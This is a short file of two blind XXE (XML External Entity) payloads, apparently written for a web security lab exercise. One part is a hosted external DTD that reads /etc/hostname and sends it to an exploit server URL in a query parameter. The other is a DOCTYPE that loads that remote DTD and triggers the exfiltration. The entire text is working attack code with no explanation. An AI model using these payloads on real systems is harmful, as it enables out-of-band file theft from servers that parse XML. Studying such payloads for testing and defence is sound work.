//hosted payload

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % stack "<!ENTITY &#x25; exfile  SYSTEM 'https://exploit-0ae1006404b4b263c00cb47f01ae0023.exploit-server.net/?hostname=%file;'>">


//xxe payload

<!DOCTYPE test [<!ENTITY % xxe SYSTEM "https://exploit-0ae1006404b4b263c00cb47f01ae0023.exploit-server.net/exploit">
%xxe; 
%stack; 
%exfile;]>